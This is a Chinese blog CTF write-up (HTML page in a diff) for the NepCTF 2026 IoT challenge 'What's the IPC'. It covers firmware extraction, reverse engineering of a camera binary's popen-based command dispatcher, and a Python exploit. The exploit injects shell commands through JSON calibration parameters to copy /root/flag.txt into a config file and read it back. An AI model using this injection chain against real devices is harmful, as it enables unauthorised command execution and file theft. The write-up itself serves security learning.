@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>What's the IPC | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="What’s the IPC也是Nepctf2026的一道pwn题，不过和之前几道题不同的是，该题偏向于IOT，所以单独放了出来。 而且也是我第一次接触摄像头类似的漏洞挖掘。一开始也是被其巨大的elf文件吓退了。多亏我师傅的悉心指导。 参考我师傅的链接：nepctf What’s the IPC | Hexo 一.固件解压首先还是对这个附件进行提取。 1binwalk -Me firmware.b">
+<meta property="og:type" content="website">
+<meta property="og:title" content="What&#39;s the IPC">
+<meta property="og:url" content="http://example.com/2026/08/21/What-s-the-IPC/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="What’s the IPC也是Nepctf2026的一道pwn题，不过和之前几道题不同的是，该题偏向于IOT，所以单独放了出来。 而且也是我第一次接触摄像头类似的漏洞挖掘。一开始也是被其巨大的elf文件吓退了。多亏我师傅的悉心指导。 参考我师傅的链接：nepctf What’s the IPC | Hexo 一.固件解压首先还是对这个附件进行提取。 1binwalk -Me firmware.b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-08-21T09:59:48.000Z">
+<meta property="article:modified_time" content="2026-08-21T17:01:58.391Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/08/21/What-s-the-IPC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'What\'s the IPC',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">What's the IPC</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="What’s-the-IPC"><a href="#What’s-the-IPC" class="headerlink" title="What’s the IPC"></a>What’s the IPC</h1><p>也是Nepctf2026的一道pwn题，不过和之前几道题不同的是，该题偏向于IOT，所以单独放了出来。</p>
+<p>而且也是我第一次接触摄像头类似的漏洞挖掘。一开始也是被其巨大的elf文件吓退了。多亏我师傅的悉心指导。</p>
+<p>参考我师傅的链接：<a target="_blank" rel="noopener" href="https://khighl.github.io/2026/08/21/nepctf_iot/">nepctf What’s the IPC | Hexo</a></p>
+<h2 id="一-固件解压"><a href="#一-固件解压" class="headerlink" title="一.固件解压"></a>一.固件解压</h2><p>首先还是对这个附件进行提取。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me firmware.bin</span><br></pre></td></tr></table></figure>
+
+<p>这个解包指令是递归提取，对提取出的文件再次进行扫描和提取，直到没有更多可识别的文件。</p>
+<p>解包成功后，我们可以找到目标的二进制文件为<code>Kylin</code>，路径在<code>_firmware.bin.extracted/_user-x.squash.img.extracted/squashfs-root/bin/Kylin</code></p>
+<h2 id="二-逆向分析"><a href="#二-逆向分析" class="headerlink" title="二.逆向分析"></a>二.逆向分析</h2><p>由于固件的大小，所以不大可能把漏洞点设置在栈溢出，所以我们这里优先去考虑命令执行。</p>
+<p>所以我们优先对system和popen去搜索，交叉引用。</p>
+<p>popen函数原型如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command, <span class="type">const</span> <span class="type">char</span> *type)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>command</code>：要执行的 Shell 命令字符串。</li>
+<li><code>type</code>：通信模式。<ul>
+<li><code>&quot;r&quot;</code>（读）：父进程可以读取子进程的命令执行结果（即命令的 <code>stdout</code> 标准输出）。</li>
+<li><code>&quot;w&quot;</code>（写）：父进程可以向子进程的 <code>stdin</code> 标准输入写入数据。</li>
+</ul>
+</li>
+<li>返回值：返回一个 <code>FILE \*</code> 文件流指针。可以像操作普通文件一样，用 <code>fread</code>、<code>fgets</code>、<code>fwrite</code> 来读取或写入命令的输出&#x2F;输入。</li>
+<li><code>pclose</code>：用于关闭文件流指针，并等待子进程结束，返回子进程的退出状态码。</li>
+</ul>
+<p><code>popen</code> ，它底层封装了三个关键的系统调用：</p>
+<ol>
+<li><code>fork()</code>：创建一个子进程。</li>
+<li><code>exec()</code>：在子进程中调用 <code>/bin/sh -c &quot;命令&quot;</code>，启动一个 Shell 来解析并执行命令。</li>
+<li><code>pipe()</code>：创建一根“管道”，连接父进程和子进程。如果 <code>type</code> 是 <code>&quot;r&quot;</code>，管道连接的是子进程的 <code>stdout</code> 到父进程的读端；如果是 <code>&quot;w&quot;</code>，连接的是父进程的写端到子进程的 <code>stdin</code>。</li>
+</ol>
+<p><code>popen</code> &#x3D; 启动一个 Shell 执行命令 + 允许 C 程序像读文件一样读取命令的输出。</p>
+<p>经过分析，发现system函数的参数，一部分是其他int类型函数的返回值，另一部分是硬编码在程序中的，我们不是很好控制。所以我们转去分析<code>popen</code>函数。</p>
+<p>通过交叉引用第一个popen，我们就有了重大的发现。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_7D98C</span><span class="params">(<span class="type">int</span> dest, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  FILE *stream_1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// r1</span></span><br><span class="line">  FILE *stream; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream_1 = popen((<span class="type">const</span> <span class="type">char</span> *)(dest + (v4 &lt;&lt; <span class="number">6</span>)), <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    v6 = (<span class="type">const</span> <span class="type">char</span> *)(dest + (v4 &lt;&lt; <span class="number">6</span>));</span><br><span class="line">    stream = stream_1;</span><br><span class="line">    <span class="keyword">if</span> ( !stream_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error, Execute %s failed!\n&quot;</span>, v6);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ATE_ControlPkt cmd %s\n&quot;</span>, v6);</span><br><span class="line">    pclose(stream);</span><br><span class="line">    usleep((<span class="type">__useconds_t</span>)<span class="string">&quot;11char_traitsIcEEE&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_7D98C</code> 的本质是一个 “批量命令执行器”：</p>
+<ol>
+<li>通过 <code>v4 &lt;&lt; 6</code> 的索引方式，要求调用者按 64 字节对齐存放命令。</li>
+<li>循环调用 <code>popen</code> 执行每条命令，遇错即停。</li>
+<li>最终由返回值控制上层业务逻辑的状态（成功&#x2F;失败）。</li>
+</ol>
+<p>然后我们继续溯源，发现该函数由<code>sub_7FCBC</code>调用。</p>
+<p>因为整个函数十分的大，所以丢给ai去具体分析。最后得出的结果是<code>CAte::HandleCmd</code> 是一个命令分发器，它解析传入的 JSON 请求（由 <code>s_2</code> 传入，通过 <code>sub_170716</code> 等函数解析到 <code>v505</code> 对象中），根据 <code>method</code> 字段的值执行不同的测试或配置操作。<br>其中两个分支会调用 <code>sub_7D98C</code>：</p>
+<ul>
+<li><code>PTRfTxCali</code> （发送校准）</li>
+<li><code>PTRfRxCali</code> （接收校准）</li>
+</ul>
+<p>得出报文的格式应该如下。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PTRfTxCali&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;param&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;mp_phypara&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x123&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp_rate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;54M&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp_bandwidth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;40M&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp_channel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp_txpower&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp_ant_tx&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三-脚本利用"><a href="#三-脚本利用" class="headerlink" title="三.脚本利用"></a>三.脚本利用</h2><p>所以我们现在可以写个测试脚本来验证一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, re, socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;nc1.ctfplus.cn&quot;</span></span><br><span class="line">PORT = <span class="number">38130</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">udp</span>(<span class="params">payload, timeout=<span class="number">30</span></span>):</span><br><span class="line">    data = json.dumps(payload, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((HOST, PORT), timeout=timeout) <span class="keyword">as</span> sock:</span><br><span class="line">        sock.sendall(data)</span><br><span class="line">        out = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = sock.recv(<span class="number">8192</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out += chunk</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">in</span> out:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> out.decode(errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">**param</span>):</span><br><span class="line">    <span class="keyword">return</span> udp(&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;PTRfTxCali&quot;</span>, <span class="string">&quot;param&quot;</span>: param&#125;)</span><br><span class="line"></span><br><span class="line">cmd(mp_phypara=<span class="string">&quot;;sleep 3;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以用时间盲注的方式来判断命令注入是否可行。</p>
+<p>在我通过不同时间长短的反应后，确定是存在的。</p>
+<p>但是由于 <code>udp</code> 函数收到的响应，是由 <code>CAte::HandleCmd</code> 上层逻辑通过 <code>sub_16EE1C</code> 发送的固定 JSON 报文，所以我们这里无法直接读出flag。</p>
+<h3 id="文件重定向"><a href="#文件重定向" class="headerlink" title="文件重定向"></a>文件重定向</h3><p>但是我们可以找到一个接口<code>Tenda_mfg_htmlVersionInfo</code></p>
+<p>核心逻辑是从设备持久化存储（实际是 <code>/opt/sav/Config/device.conf</code>）中提取键值对，并打包进 JSON 响应。</p>
+<p>关键执行流如下：</p>
+<ol>
+<li>匹配方法：当 <code>method</code> 为 <code>Tenda_mfg_htmlVersionInfo</code> 时进入分支。</li>
+<li>读取键值：多次调用 <code>sub_7EA34(a1, [KEY], &amp;s_)</code>，这个函数的作用就是从 <code>a1</code>中根据 KEY 取出对应的 VALUE 字符串。</li>
+<li>回显填充：通过 <code>sub_171858(v584, &quot;param&quot;)</code> 获取请求中的 <code>param</code>，再用 <code>sub_170074</code> 将读取到的值赋值给响应中的对应字段。</li>
+<li>最终效果：只要 <code>device.conf</code> 中 <code>mac_info=FLAG&#123;xxx&#125;</code>，那么调用该接口，返回的报文中 <code>MAC</code> 字段就会直接显示 <code>FLAG&#123;xxx&#125;</code>。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_7EA34</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__opt_sav_Config_hostapd.conf_; <span class="comment">// r1</span></span><br><span class="line">  FILE *stream; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> dest_1[<span class="number">32</span>]; <span class="comment">// [sp+8h] [bp-1B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [sp+28h] [bp-190h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">272</span>]; <span class="comment">// [sp+A8h] [bp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)(a3 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  **(_BYTE **)a3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(dest_1, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest_1));</span><br><span class="line">  <span class="keyword">if</span> ( sub_73840(a2, <span class="string">&quot;ssid&quot;</span>) || sub_73840(a2, <span class="string">&quot;wpa_passphrase&quot;</span>) )</span><br><span class="line">    __opt_sav_Config_hostapd.conf_ = off_63BE48[<span class="number">0</span>];<span class="comment">// &quot;/opt/sav/Config/hostapd.conf&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __opt_sav_Config_hostapd.conf_ = off_63BE44[<span class="number">0</span>];<span class="comment">// &quot;/opt/sav/Config/device.conf&quot;</span></span><br><span class="line">  <span class="built_in">strncpy</span>(dest_1, __opt_sav_Config_hostapd.conf_, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( access(dest_1, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_615A2(&amp;byte_5CD605, <span class="string">&quot;../../Functions/Ate.cpp&quot;</span>, <span class="number">3289</span>, <span class="number">1</span>, <span class="string">&quot;CAte::GetAteInfo access path %s failed\n&quot;</span>, dest_1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(dest_1, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_615A2(&amp;byte_5CD605, <span class="string">&quot;../../Functions/Ate.cpp&quot;</span>, <span class="number">3296</span>, <span class="number">1</span>, <span class="string">&quot;CAte::GetAteInfo fopen path %s failed\n&quot;</span>, dest_1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xF6u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    src = fgets(s, <span class="number">246</span>, stream);</span><br><span class="line">    <span class="keyword">if</span> ( !src )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(s, *(<span class="type">const</span> <span class="type">char</span> **)a2);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      src = &amp;v9[*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">1</span>];</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, src, <span class="number">0x80u</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">if</span> ( !src )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  sub_4A12DE(a3, dest);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_7EA34</code> 本质上是一个 “基于白名单路径的配置读取器”。它原本设计用于安全地读取设备固化配置。</p>
+<p>结合就可以得到利用链条</p>
+<p>写入 <code>mac_info=FLAG</code> 到 <code>/opt/sav/Config/device.conf</code>，调用 <code>Tenda_mfg_htmlVersionInfo</code> 接口，<code>strstr</code> 在文件中找到 <code>&quot;mac_info&quot;</code>，Flag 被填回响应 JSON 的 <code>MAC</code> 字段。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, re, socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;nc1.ctfplus.cn&quot;</span></span><br><span class="line">PORT = <span class="number">38130</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">udp</span>(<span class="params">payload, timeout=<span class="number">30</span></span>):</span><br><span class="line">    data = json.dumps(payload, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((HOST, PORT), timeout=timeout) <span class="keyword">as</span> sock:</span><br><span class="line">        sock.sendall(data)</span><br><span class="line">        out = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = sock.recv(<span class="number">8192</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out += chunk</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">in</span> out:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> out.decode(errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">**param</span>):</span><br><span class="line">    <span class="keyword">return</span> udp(&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;PTRfTxCali&quot;</span>, <span class="string">&quot;param&quot;</span>: param&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac</span>():</span><br><span class="line">    resp = udp(&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;Tenda_mfg_htmlVersionInfo&quot;</span>, <span class="string">&quot;param&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">    m = re.search(<span class="string">r&#x27;&quot;MAC&quot;:&quot;(.*?)&quot;&#x27;</span>, resp)</span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>).encode().decode(<span class="string">&quot;unicode_escape&quot;</span>).strip()</span><br><span class="line"></span><br><span class="line">cmd(mp_phypara=<span class="string">&quot;;cat /root/flag.txt&gt;/tmp/f&quot;</span>)</span><br><span class="line">cmd(mp_phypara=<span class="string">&quot;;sed -i s/^/mac_info=/ /tmp/f&quot;</span>)</span><br><span class="line">cmd(mp_rate=<span class="string">&quot;;cp /tmp/f /opt/sav/Config/device.conf&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mac())</span><br></pre></td></tr></table></figure>
+
+<p>给出exp的解释，这也是我第一次接触发送报文需要一定格式的脚本。所以直接抄的我师傅的，唉，还是有很多要学的地方。</p>
+<ul>
+<li><p><code>json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;))</code>：将 Python 字典 <code>payload</code> 转为 JSON 字符串。</p>
+<ul>
+<li><code>separators=(&quot;,&quot;, &quot;:&quot;)</code> 的作用是移除 JSON 中多余的空。默认情况下，JSON 会带空格（如 <code>&#123;&quot;method&quot;: &quot;PTR&quot;&#125;</code>），加上这个参数后变成 <code>&#123;&quot;method&quot;:&quot;PTR&quot;&#125;</code>。这能减少网络传输量，同时避免某些服务端对空格敏感。</li>
+</ul>
+</li>
+<li><p><code>.encode()</code>：将 JSON 字符串按 UTF-8 编码成字节流（<code>bytes</code>），因为 Socket 只能发送字节。</p>
+</li>
+<li><p><code>+ b&quot;\n&quot;</code>：在数据末尾追加一个换行符（字节形式）。这是一个协议分隔符——服务端检测到 <code>\n</code> 就认为报文结束（见下方接收循环的 <code>if b&quot;\n&quot; in out</code>）。</p>
+</li>
+<li><p><code>socket.create_connection((HOST, PORT), timeout=timeout)</code>：这是一个工厂函数，创建 TCP 客户端套接字并连接到目标地址。</p>
+</li>
+<li><p><code>with ... as sock</code>：上下文管理器。无论代码块是否异常结束，都会自动调用 <code>sock.close()</code> 释放端口资源，避免资源泄露。</p>
+</li>
